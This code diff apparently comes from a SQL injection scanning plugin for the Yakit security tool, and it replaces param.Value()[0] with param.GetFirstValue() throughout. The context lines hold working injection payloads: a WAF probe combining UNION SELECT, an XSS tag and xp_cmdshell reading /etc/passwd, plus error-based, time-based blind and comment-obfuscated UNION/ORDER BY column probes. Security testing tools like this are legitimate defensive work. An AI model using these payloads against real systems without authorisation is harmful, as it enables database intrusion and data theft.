@@ -69,7 +69,7 @@ func wafAnalyse(req /* []byte */, rsp /* []byte */, original /* []byte */, isHtt
     if WAFCheck {
         IPS_WAF_CHECK_RATIO := 0.5
         for _, param := range freq.GetCommonParams() {
-            IPS_WAF_CHECK_PAYLOAD := parseStr(param.Value()[0]) + " AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')-- "
+            IPS_WAF_CHECK_PAYLOAD := parseStr(param.GetFirstValue()) + " AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')-- "
             testResp, err := param.Fuzz(IPS_WAF_CHECK_PAYLOAD).ExecFirst(fuzz.WithNamingContext("sql"),
                                                                          fuzz.WithConcurrentLimit(1))
             if err != nil {
@@ -147,7 +147,7 @@ func heuristicCheckIfInjectable(url /* string */, req /* []byte */, isHttps /* b
 
     for pos, param := range CommonParams {
         var rsp, err
-        if str.MatchAllOfRegexp(parseStr(param.Value()[0]), `^[0-9]+$`) {
+        if str.MatchAllOfRegexp(parseStr(param.GetFirstValue()), `^[0-9]+$`) {
             rsp, err = param.Fuzz(randomTestString + randString).ExecFirst(fuzz.WithNamingContext("sql"),
                                                                            fuzz.WithConcurrentLimit(1))
             time.Sleep(0.5)
@@ -237,7 +237,7 @@ func checkErrorBased(pos /* int */, req /* []byte */, castDetected /* bool */, C
         for index, param := range CommonParams {
             if index == pos {
                 paramName = param.Name()
-                payload := parseStr(param.Value()[0]) + getErrorBasedPreCheckPayload()
+                payload := parseStr(param.GetFirstValue()) + getErrorBasedPreCheckPayload()
                 result, err = param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
                 if err != nil {
                     yakit_output("尝试检测 Error-Based SQL Injection Payload 失败")
@@ -289,7 +289,7 @@ func checkErrorBased(pos /* int */, req /* []byte */, castDetected /* bool */, C
             if index == pos {
                 paramName = param.Name()
                 var payload
-                if str.MatchAllOfRegexp(parseStr(param.Value()[0]), `^[0-9]+$`) {
+                if str.MatchAllOfRegexp(parseStr(param.GetFirstValue()), `^[0-9]+$`) {
                     payload = randstr(4) + getErrorBasedPreCheckPayload()
                 } else {
                     payload = parseStr(randn(99999, 9999999)) + getErrorBasedPreCheckPayload()
@@ -347,7 +347,7 @@ func checkErrorBased(pos /* int */, req /* []byte */, castDetected /* bool */, C
         for index, param := range CommonParams {
             if index == pos {
                 paramName = param.Name()
-                payload := parseStr(param.Value()[0]) + getErrorBasedPreCheckPayload()
+                payload := parseStr(param.GetFirstValue()) + getErrorBasedPreCheckPayload()
                 result, err = param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1))
                 if err != nil {
                     yakit_output("尝试检测 Error-Based SQL Injection Payload 失败")
@@ -410,11 +410,11 @@ func checkCloseType(pos /* int */, req /* []byte */, CommonParams /* []*mutate.F
 
     for index, param := range CommonParams {
         if index == pos {
-            numeric := str.MatchAllOfRegexp(parseStr(param.Value()[0]), `^[0-9]+$`)
+            numeric := str.MatchAllOfRegexp(parseStr(param.GetFirstValue()), `^[0-9]+$`)
             if numeric {
-                closeType := checkParam(param, parseStr(param.Value()[0]), originResult, numeric)
+                closeType := checkParam(param, parseStr(param.GetFirstValue()), originResult, numeric)
                 if closeType == -1 {
-                    closeType = checkParam(param, parseStr(param.Value()[0]) + "\n", originResult, numeric)
+                    closeType = checkParam(param, parseStr(param.GetFirstValue()) + "\n", originResult, numeric)
                     if closeType == -1 {
                         return -1, false//进行下一个参数的检测
 
@@ -427,9 +427,9 @@ func checkCloseType(pos /* int */, req /* []byte */, CommonParams /* []*mutate.F
                 }
 
             } else {
-                closeType := checkParam(param, parseStr(param.Value()[0]), originResult, numeric)
+                closeType := checkParam(param, parseStr(param.GetFirstValue()), originResult, numeric)
                 if closeType == -1 {
-                    closeType = checkParam(param, parseStr(param.Value()[0]) + "\n", originResult, numeric)
+                    closeType = checkParam(param, parseStr(param.GetFirstValue()) + "\n", originResult, numeric)
                     if closeType == -1 {
                         return -1, false
                     } else {
@@ -472,8 +472,8 @@ func checkTimeBasedBlind(pos /* int */, req /* []byte */, CommonParams /* []*mut
     for index, param := range CommonParams {
         if index == pos {
             yakit_output("尝试时间注入")
-            payload = parseStr(param.Value()[0]) + payload
-            payload1 = parseStr(param.Value()[0]) + payload1
+            payload = parseStr(param.GetFirstValue()) + payload
+            payload1 = parseStr(param.GetFirstValue()) + payload1
             result, err = param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"), fuzz.WithConcurrentLimit(1),
                                                         fuzz.WithTimeOut(30))
             if err != nil {
@@ -593,9 +593,9 @@ func guessColumnNum(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte
                 for index, param := range CommonParams {
                     if index == pos {
                         if lineBreak {
-                            payload = parseStr(param.Value()[0]) + "\n" + CLOSE_TYPE[closeType] + `/**/ORDeR/**/bY/**/` + parseStr(columnNum) + "-- "
+                            payload = parseStr(param.GetFirstValue()) + "\n" + CLOSE_TYPE[closeType] + `/**/ORDeR/**/bY/**/` + parseStr(columnNum) + "-- "
                         } else {
-                            payload = parseStr(param.Value()[0]) + CLOSE_TYPE[closeType] + `/**/ORDeR/**/bY/**/` + parseStr(columnNum) + "-- "
+                            payload = parseStr(param.GetFirstValue()) + CLOSE_TYPE[closeType] + `/**/ORDeR/**/bY/**/` + parseStr(columnNum) + "-- "
                         }
                         rspRisk, err := param.Fuzz(payload).ExecFirst(fuzz.WithNamingContext("sql"),fuzz.WithConcurrentLimit(1))
                         if err == nil{
@@ -637,7 +637,7 @@ func guessColumnNum(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte
                         yakit_output(str.f(
                             "存在基于UNION SQL 注入: [参数名:%v 原值:%v]",
                             param.Name(),
-                            param.Value()[0],
+                            param.GetFirstValue(),
                         ))
                         yakit_output(str.f("UNION 列数经过ORDER BY 探测为" + parseStr(columnNum)))
                     }
@@ -662,9 +662,9 @@ func orderByTest(number /* int */, pos /* int */, req /* []byte */, TEMPLATE_PAG
     for index, param := range CommonParams {
         if index == pos {
             if lineBreak {
-                payload = parseStr(param.Value()[0]) + "\n" + CLOSE_TYPE[closeType] + `/**/ORDeR/**/bY/**/` + parseStr(number) + "-- "
+                payload = parseStr(param.GetFirstValue()) + "\n" + CLOSE_TYPE[closeType] + `/**/ORDeR/**/bY/**/` + parseStr(number) + "-- "
             } else {
-                payload = parseStr(param.Value()[0]) + CLOSE_TYPE[closeType] + `/**/ORDeR/**/bY/**/` + parseStr(number) + "-- "
+                payload = parseStr(param.GetFirstValue()) + CLOSE_TYPE[closeType] + `/**/ORDeR/**/bY/**/` + parseStr(number) + "-- "
             }
 
 
@@ -758,11 +758,11 @@ func bruteColumnNum(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte
         if index == pos {
             for i := LOWER_COUNT; i <= UPPER_COUNT; i++ {
                 if lineBreak {
-                    payload = parseStr(param.Value()[0]) + "\n" + CLOSE_TYPE[closeType] + `/**/UniOn/**/All/**/Select/**/` + str.Repeat(
+                    payload = parseStr(param.GetFirstValue()) + "\n" + CLOSE_TYPE[closeType] + `/**/UniOn/**/All/**/Select/**/` + str.Repeat(
                                                                                                                                         "NULL,",
                                                                                                                                         i - 1) + randStr
                 } else {
-                    payload = parseStr(param.Value()[0]) + CLOSE_TYPE[closeType] + `/**/UniOn/**/All/**/Select/**/` + str.Repeat(
+                    payload = parseStr(param.GetFirstValue()) + CLOSE_TYPE[closeType] + `/**/UniOn/**/All/**/Select/**/` + str.Repeat(
                                                                                                                                  "NULL,",
                                                                                                                                  i - 1) + randStr
                 }
@@ -887,13 +887,13 @@ func bruteColumnNum(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte
         for index, param := range CommonParams {
             if index == pos {
                 if lineBreak {
-                    payload = parseStr(param.Value()[0]) + "\n" + CLOSE_TYPE[closeType] + `/**/UniOn/**/All/**/Select/**/` + str.Repeat(
+                    payload = parseStr(param.GetFirstValue()) + "\n" + CLOSE_TYPE[closeType] + `/**/UniOn/**/All/**/Select/**/` + str.Repeat(
                                                                                                                                         str.f(
                                                                                                                                               `md5('%v'),`,
                                                                                                                                               md5Randstr),
                                                                                                                                         parseInt(columnNum))
                 } else {
-                    payload = parseStr(param.Value()[0]) + CLOSE_TYPE[closeType] + `/**/UniOn/**/All/**/Select/**/` + str.Repeat(
+                    payload = parseStr(param.GetFirstValue()) + CLOSE_TYPE[closeType] + `/**/UniOn/**/All/**/Select/**/` + str.Repeat(
                                                                                                                                  str.f(
                                                                                                                                        `md5('%v'),`,
                                                                                                                                        md5Randstr),
@@ -933,7 +933,7 @@ func bruteColumnNum(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte
                     yakit_output(str.f(
                         "存在基于UNION SQL 注入: [参数名:%v 原值:%v]",
                         param.Name(),
-                        param.Value()[0],
+                        param.GetFirstValue(),
                     ))
                     yakit_output(str.f("UNION 列数经过UNION BruteForce ratio探测为" + columnNum))
                     return parseInt(columnNum)
@@ -950,11 +950,11 @@ func bruteColumnNum(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte
         if index == pos {
             for i := LOWER_COUNT; i <= UPPER_COUNT; i++ {
                 if lineBreak {
-                    payload = parseStr(param.Value()[0]) + "\n" + CLOSE_TYPE[closeType] + `/**/UniOn/**/Select/**/` + str.Repeat(
+                    payload = parseStr(param.GetFirstValue()) + "\n" + CLOSE_TYPE[closeType] + `/**/UniOn/**/Select/**/` + str.Repeat(
                                                                                                                                  randStr,
                                                                                                                                  (i - 1))
                 } else {
-                    payload = parseStr(param.Value()[0]) + CLOSE_TYPE[closeType] + `/**/UniOn/**/Select/**/` + str.Repeat(
+                    payload = parseStr(param.GetFirstValue()) + CLOSE_TYPE[closeType] + `/**/UniOn/**/Select/**/` + str.Repeat(
                                                                                                                           randStr,
                                                                                                                           (i - 1))
                 }
@@ -999,7 +999,7 @@ func bruteColumnNum(pos /* int */, req /* []byte */, TEMPLATE_PAGE_RSP /* []byte
                     yakit_output(str.f(
                         "可能存在基于UNION SQL 注入: [参数名:%v 原值:%v]",
                         param.Name(),
-                        param.Value()[0],
+                        param.GetFirstValue(),
                     ))
                     yakit_output(str.f("UNION 列数经过UNION BruteForce sleep探测为" + parseStr(i)))
                     return i
